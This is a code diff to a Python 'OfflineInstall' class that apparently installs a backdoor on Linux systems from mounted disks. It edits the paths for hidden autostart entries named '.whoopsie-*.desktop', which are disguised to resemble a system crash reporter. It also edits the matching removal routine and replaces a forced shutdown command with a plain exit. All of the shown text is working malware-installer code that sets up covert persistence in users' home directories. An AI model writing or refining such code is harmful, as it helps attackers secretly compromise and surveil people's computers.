@@ -1095,7 +1095,7 @@ class OfflineInstall(object):
 			if self.tablin['homedisk'] == None:			
 				backdoor_start_path = "/mnt" + i['home'] + "/.config/autostart/.whoopsie-" + self.backconf['hdir'] + ".desktop"
 			else:
-				backdoor_start_path = "/mnt2" + i['home'] + "/.config/autostart/.whoopsie-" + self.backconf['hdir'] + ".desktop"
+				backdoor_start_path = "/mnt2" + i['home'][5:] + "/.config/autostart/.whoopsie-" + self.backconf['hdir'] + ".desktop"
 
 			print("      -> " + backdoor_path1)
 			print("      -> " + backdoor_core_path1)
@@ -1704,11 +1704,10 @@ class OfflineInstall(object):
 		the_backdoor_config = the_backdoor_path + "/.cache"
 
 		if self.tablin['homedisk'] != None:
-			the_launch_path = "/mnt2"
+			the_launch_path = "/mnt2" + home[5:] + "/.config/autostart"
 		else:		
-			the_launch_path = "/mnt"
+			the_launch_path = "/mnt" + home + "/.config/autostart"
 
-		the_launch_path += home + "/.config/autostart"
 		current_backdoor_name = ".whoopsie-" + self.backconf['hdir'] + ".desktop"
 		desktop_content = "[Desktop Entry]\n" \
 				  "Type=Application\n" \
@@ -2235,11 +2234,10 @@ class OfflineInstall(object):
 		backdoor_path = ""
 
 		if self.tablin['homedisk'] != None:
-			backdoor_path = "/mnt2"
+			backdoor_path = "/mnt2" + home[5:] + "/.config/autostart/.whoopsie-" + self.backconf['hdir'] + ".desktop"
 		else:
-			backdoor_path = "/mnt"
+			backdoor_path = "/mnt" + home + "/.config/autostart/.whoopsie-" + self.backconf['hdir'] + ".desktop"
 
-		backdoor_path += home + "/.config/autostart/.whoopsie-" + self.backconf['hdir'] + ".desktop"
 		try:
 			os.remove(backdoor_path)
 			print("    Remove [OK] -> " + backdoor_path)
@@ -3181,7 +3179,8 @@ class OfflineInstall(object):
 		print("Shutdown action...")
 
 		self.stop()
-		subprocess.call("shutdown -h now", shell=True)
+#TODO		subprocess.call("shutdown -h now", shell=True)
+		sys.exit(0)
 
 	#
 	# Reboot the machine
